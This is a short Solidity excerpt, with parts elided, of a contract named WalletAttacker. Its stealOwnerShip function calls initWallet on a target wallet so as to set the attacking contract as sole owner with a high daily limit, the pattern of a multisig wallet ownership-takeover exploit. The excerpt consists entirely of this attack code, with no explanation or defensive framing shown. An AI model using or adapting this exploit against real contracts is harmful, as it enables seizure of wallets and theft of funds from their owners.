contract WalletAttacker {
   ...
  function stealOwnerShip() external {
    address[1] memory owners = [address(this)];
    uint _required = 1;
    uint _daylimit = 1000000000000000000;
    targetWallet.call(
      abi.encodeWithSelector(
        bytes4(keccak256("initWallet(address[],uint,uint)")),
        owners,
        _required,
        _daylimit
      )
    );
  }
}
